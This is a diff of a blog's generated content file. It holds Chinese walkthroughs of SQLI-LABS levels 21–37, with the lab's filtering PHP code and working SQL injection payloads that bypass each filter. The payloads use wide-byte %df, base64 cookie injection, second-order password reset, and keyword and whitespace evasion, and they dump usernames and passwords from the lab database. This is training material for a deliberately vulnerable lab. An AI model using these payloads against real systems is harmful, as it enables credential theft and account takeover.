+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># \ 转换为 \\</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &#x27; 转为\&#x27;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &quot; 转为\&quot;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                         </span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用方法</li>
+</ul>
+<p>这里使用宽字节注入，在被过滤的符号前面加入<code>%df</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= addslashes(<span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>
+<p>此处过滤使用函数 <strong>addslashes()</strong> 返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：  单引号（’）  双引号（”）  反斜杠（\）</p>
+<p>这里依然可以使用宽字节注入绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-33&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = addslashes(<span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= addslashes(<span class="variable">$passwd1</span>);</span><br></pre></td></tr></table></figure>
+<p>和Less-33的过滤方法一样，只不过换成了POST方式提交数据，而POST方式无法直接使用<code>%df</code>来进行注入，需要用Burp Suite进行抓包改包。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305173404414.png" alt="image-20210305173404414"></p>
+<p>在图中的%27前面加上<code>%df</code>即可。</p>
+<ul>
+<li>这里还有另一种思路</li>
+</ul>
+<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 � ‘ 。我们就 可以利用这个方式进行尝试。</p>
+<p>可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>尝试一个经典的万能密码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305175129233.png" alt="image-20210305175129233"></p>
+<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>这一关的参数的数据类型为数字型，也就是说无需<code>&#39;</code>来闭合参数，但是这里的过滤措施和Less-33完全一致，相当与无用功。。直接进行联合注入即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= mysql_real_escape_string(<span class="variable">$string</span>)</span><br></pre></td></tr></table></figure>
+<p>这里使用了**mysql_real_escape_string()**函数进行转义，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。下列字符受影响： </p>
+<p> (\x00)  (\n)  (\r)   (‘)  (“)  (\x1a)</p>
+<p>这里仍然可以使用宽字节注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-36&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>本关与 34 关是大致相似的，区别在于处理 post 内容用的是 <strong>mysql_real_escape_string()</strong> 函数，而不是 **addslashes()**函数，但是原理是一样的。都是通过截包改包的方法进行注入。或者使用将 utf-8 转换为 utf-16 或 utf-32的方法直接在hackbar进行POST请求。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<ul>
+<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQLI-LABS (Basic Challenges) 1-20关</title>
     <url>/2021/03/07/SQLI-LABS%20(Basic%20Challenges)%201-20%E5%85%B3/</url>
     <content><![CDATA[<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ul>
@@ -2873,316 +3273,6 @@
 <p>同样地，使用联合注入也能行</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;1&#39; UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304181017713.png" alt="image-20210304181017713"></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<ul>
-<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQLI-LABS (Adv Injections) 21-37关</title>
-    <url>/2021/03/07/SQLI-LABS%20(Adv%20Injections)%2021-37%E5%85%B3/</url>
-    <content><![CDATA[<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">                 <span class="comment"># 对 cookee 进行 base64 解密</span></span><br><span class="line">        <span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>通过源码看出，后端会把传入的cookie中的<code>uname</code>参数进行base64解密，然后再进行查询，所以我们传入的cookie中的<code>uname</code>要尽心base64加密才行。同时注意到，这里的闭合方式为<code>(&#39;$uname&#39;)</code></p>
-<p>查询语句：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;sqlsec&#39;) union select 1,2,(SELECT GROUP_CONCAT(username,&#39;:&#39;,password) FROM users)#</span><br></pre></td></tr></table></figure>
-<p>我们可以利用hackbar进行base64加密：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSwnOicscGFzc3dvcmQpIEZST00gdXNlcnMpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304212001660.png" alt="image-20210304212001660"></p>
-<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>可以看出仅仅实在Less-21的基础上把闭合方式改为了<code>&quot;$cookee1&quot;</code>，注入方式参考Less-21</p>
-<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> 有查询结果:</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
-<p>可以看出这里使用正则匹配过滤了<code>#</code>和<code>--</code>，导致了我们无法把查询语句中参数<code>$id</code>后面的限制仅输出1个内容给屏蔽掉。这里我们可以构造语句：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,password) from users),&#39;3</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215528582.png" alt="image-20210304215528582"></p>
-<p>解释：</p>
-<ol>
-<li><p>首先是id的第一个参数为-1，因为 sql 语句执行了两个 select 语句，第一个 select 为 id 的选择语 句，第二个为我们构造的 select 语句。只有一个数据可以输出，为了让我们自己构造的数据 可以正常输出，第一个 select 要没有结果，所以-1 或者超过数据库所有数据都可以。</p>
-</li>
-<li><p>最后3前面的<code>&#39;</code>目的是闭合查询语句最后的<code>&#39;</code>，使其不会错误</p>
-</li>
-<li><p>此处也可以进行报错注入，盲注</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select extractvalue(1,concat(0x7e,(select database()),0x7e))),&#39;3</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215543764.png" alt="image-20210304215543764"></p>
-<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><ul>
-<li><p>查看代码</p>
-<ul>
-<li><strong>Index.php</strong></li>
-</ul>
-<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了。</p>
-<p>输入用户名和密码之后会把数据传输到 <strong>login.php</strong> 进行验证。点击忘记密码会跳转到<strong>forgot_password.php</strong>，点击创建新用户会跳转到<strong>new_user.php</strong>。</p>
-<ul>
-<li><strong>failed.php</strong></li>
-</ul>
-<p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p>
-<ul>
-<li><strong>forgot_password.php</strong></li>
-</ul>
-<p>简单提示：如果你忘记密码 请 hack it</p>
-<ul>
-<li><strong>login.php</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登陆成功：</span><br><span class="line">    <span class="comment">#设置session和cookie</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>
-<p><code>$username</code>和<code>$password</code>两个参数都被过滤掉，无法从这里进行注入。</p>
-<ul>
-<li><strong>new_user.php</strong></li>
-</ul>
-<p>创建新用户的表单页面，本文件主要存放前段代码。</p>
-<ul>
-<li><strong>login_create.php</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span></span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前用户信息</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">#如果当前用户已经存在 无法注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 两次输入密码一致：</span><br><span class="line">  <span class="comment"># 将记录插入数据库中</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br><span class="line">      查询完成后 重定向到首页</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示两次输入密码不一致</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>pass_change.php</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 检测未登录：</span><br><span class="line">    重定向到首页</span><br><span class="line"><span class="keyword">if</span> 检测到提交表单：</span><br><span class="line">  <span class="comment"># 对 pass 都进行了过滤</span></span><br><span class="line">  <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 两次密码一致:</span><br><span class="line">        <span class="comment"># 直接将 username 拼接到 SQL 语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示密码不一致 并重定向到 fail.php</span><br></pre></td></tr></table></figure></li>
-<li><p>思路分析</p>
-</li>
-</ul>
-<p>这里需要利用到二次注入。看更新密码的地方：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span><span class="comment"># and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>相当于<code>#</code>后面的都被屏蔽掉了，直接修改了 admin 的用户密码。</p>
-<ul>
-<li><p>演示步骤</p>
-<ol>
-<li><p>注册一个名字为<code>admin&#39;#</code>的用户</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100428917.png" alt="image-20210305100428917"></p>
-</li>
-<li><p>注册好之后登陆该账户，对密码进行修改</p>
-</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100925703.png" alt="image-20210305100925703"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100819324.png" alt="image-20210305100819324"></p>
-</li>
-</ul>
-<p>可以看到此时admin用户的密码被修改为了000</p>
-<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><ul>
-<li>查看代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>= blacklist(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>  可以看出后端把传进去的参数进行了过滤，把<code>or</code>和<code>and</code>不区分大小写替换为了空字符。</p>
-<ul>
-<li>or 和 and 过滤的绕过<ol>
-<li>大小写变形 Or,OR,oR</li>
-<li>编码，hex，urlencode</li>
-<li>添加注释/*or*/</li>
-<li>利用符号 and=&amp;&amp; or=||</li>
-<li>双写 oorr，anandd</li>
-</ol>
-</li>
-</ul>
-<p>由于password中含有or，所以要在里面双写</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,passwoorrd) from users),3--+</span><br></pre></td></tr></table></figure>
-<p>使用报错或者盲注时推荐使用符号</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>值得一提的是，如果使用&amp;&amp;来代替and，需要对&amp;&amp;进行url编码，否则&amp;后面的内容会被当成第二个参数传递。</p>
-</blockquote>
-<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这一关就是Less-25的小改，参数类型改为了数字型，并且屏蔽了错误信息显示。因此这里只能使用联合注入和盲注。</p>
-<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  这里过滤规则变多了，把 or，and，/*，#，–，/和空格给过滤掉 </p>
-<ul>
-<li><p>绕过方法</p>
-<ul>
-<li>之前已经提过and，or和注释符被过滤时候的绕过方法，这里不再赘述</li>
-<li>空格被过滤可以使用如下的符号来代替</li>
-</ul>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="left">符号</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">%09</td>
-<td align="left">TAB 键(水平)</td>
-</tr>
-<tr>
-<td align="left">%0a</td>
-<td align="left">新建一行</td>
-</tr>
-<tr>
-<td align="left">%0c</td>
-<td align="left">新的一页</td>
-</tr>
-<tr>
-<td align="left">%0d</td>
-<td align="left">return 功能</td>
-</tr>
-<tr>
-<td align="left">%0b</td>
-<td align="left">TAB 键(垂直)</td>
-</tr>
-<tr>
-<td align="left">%a0</td>
-<td align="left">空格</td>
-</tr>
-</tbody></table>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26&#x2F;</span><br><span class="line">?id&#x3D;100&#39;%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||&#39;1</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>该方法无法再window上实现，因为有些符号不能被解析,这里借助了在线容器进行测试</p>
-<p><a class="link"   href="https://www.vsplate.com/labs.php" >https://www.vsplate.com/labs.php<i class="fas fa-external-link-alt"></i></a></p>
-</blockquote>
-<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>与 Less-26 相比，只是拼接方式改为了<code>(&#39;$id&#39;)</code>，因为没有输出报错信息，所以不能使用报错注入了。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||(&#39;1</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><ul>
-<li>查看源码</li>
-</ul>
